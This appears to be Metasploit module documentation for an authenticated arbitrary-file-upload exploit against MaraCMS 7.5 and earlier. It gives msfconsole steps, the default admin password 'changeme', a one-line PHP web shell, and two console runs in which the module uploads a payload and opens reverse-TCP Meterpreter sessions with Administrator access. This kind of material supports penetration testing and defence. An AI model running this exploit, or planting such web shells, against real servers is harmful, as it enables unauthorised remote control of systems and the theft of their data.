## Vulnerable Application
This module exploits an arbitrary file upload vulnerability in MaraCMS 7.5 and prior in order to execute arbitrary commands.

The module first tries to obtain the MaraCMS version from `/about.php` (for MaraCMS 7.5, the version number mentioned is `7.2`.)
The module then visits `/?login` to obtain the `shash` token, which is required for authentication. Next,
the module sends an HTTP POST request to `codebase/handler.php` in order to obtain the salt used by MaraCMS to create password hashes.
The module then uses the `shash` token and the salt to create the required authentication hashes,
and sends these via a second HTTP POST request to the handler.

If authentication is successful, the module tries to upload a malicious PHP file to the web root,
again via an HTTP POST request to `codebase/handler.php.`
If the `php` target is selected, the payload is embedded in the uploaded file
and the module attempts to execute the payload via an HTTP GET request to this file.
For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET["cmd"]); ?>`.
Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests
in the form of `/<php_web_shell>?<cmd>=<payload>`.

Valid credentials for a MaraCMS `admin` or `manager` account are required.
This module has been successfully tested against MaraCMS 7.5 running on Windows Server 2012 (XAMPP server).

Vulnerable software for testing can be downloaded [here](https://sourceforge.net/projects/maracms/).
Installation is just a matter of unzipping the package to a php-capable webhost.
The requirements specified on SourceForge are an Apache or equivalent webserver (LightTPD, Nginx, etc.)
and a PHP version from 5.3 to 7.1.1. Both of these requirements can easily be fulfilled by downloading
an older version of XAMPP server for Windows or Linux from [here](https://sourceforge.net/projects/xampp/).
MaraCMS does not require a database, nor an installation script.

## Verification Steps
1. Install the module as usual
2. Start msfconsole
3. Do: `use exploit/multi/http/maracms_upload_exec`
4. Do: `set RHOSTS [IP]`
5. Do: `set USERNAME [username for the MaraCMS account]`
6. Do: `set PASSWORD [password for the MaraCMS account]`
7. Do: `set target [target]`
8. Do: `set payload [payload]`
9. Do: `set LHOST [IP]`
10. Do: `exploit`

## Options
### PASSWORD
The password for the MaraCMS account to authenticate with. The default value is `changeme`,
as this is the default admin password for MaraCMS.
### TARGETURI
The base path to MaraCMS. The default value is `/`.
### USERNAME
The username for the MaraCMS account to authenticate with. The default value is `admin`.

## Targets
```
Id  Name
--  ----
0   PHP
1   Linux
2   Windows
```

## Scenarios
### MaraCMS 7.5 running on Windows Server 2012 (XAMPP server) - PHP target
```
msf5 exploit(multi/http/maracms_upload_exec) > show options

Module options (exploit/multi/http/maracms_upload_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   changeme         yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.20     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to MaraCMS
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  1192.168.1.12    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP


msf5 exploit(multi/http/maracms_upload_exec) > run

[*] Started reverse TCP handler on 192.168.1.12 :4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Target is most likely MaraCMS with version 7.5 or lower
[*] Obtained salt `9781` from server. Using salt to authenticate...
[+] Successfully authenticated to MaraCMS
[*] Uploading payload as zKEdBPw5j.php...
[+] Successfully uploaded zKEdBPw5j.php
[*] Executing the payload...
[*] Sending stage (38288 bytes) to 192.168.1.20 
[*] Meterpreter session 15 opened (192.168.1.12 :4444 -> 192.168.1.20 :49324) at 2020-09-22 15:30:14 -0400

meterpreter > 
[!] Deleting: zKEdBPw5j.php
[+] zKEdBPw5j.php removed
getuid
Server username: Administrator (0)
meterpreter >
```
### MaraCMS 7.5 running on Windows Server 2012 (XAMPP server) - Windows target
```
msf5 exploit(multi/http/maracms_upload_exec) > run

[*] Started reverse TCP handler on 1192.168.1.12:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Target is most likely MaraCMS with version 7.5 or lower
[*] Obtained salt `6521` from server. Using salt to authenticate...
[+] Successfully authenticated to MaraCMS
[*] Uploading payload as gCUII0Fx41Q.php...
[+] Successfully uploaded gCUII0Fx41Q.php
[*] Executing the payload via a series of HTTP GET requests to `/gCUII0Fx41Q.php?1xFqv=<command>`
[*] Command Stager progress -  17.01% done (2046/12025 bytes)
[*] Command Stager progress -  34.03% done (4092/12025 bytes)
[*] Command Stager progress -  51.04% done (6138/12025 bytes)
[*] Command Stager progress -  68.06% done (8184/12025 bytes)
[*] Command Stager progress -  84.24% done (10130/12025 bytes)
[*] Sending stage (201283 bytes) to 192.168.1.20
[*] Meterpreter session 14 opened (1192.168.1.12:4444 -> 192.168.1.20:49323) at 2020-09-22 15:30:05 -0400
[*] Command Stager progress - 100.00% done (12025/12025 bytes)

meterpreter > 
[!] Deleting: gCUII0Fx41Q.php
[+] gCUII0Fx41Q.php removed
getuid
Server username: WIN-S417DG9MRTR\Administrator
meterpreter >
```
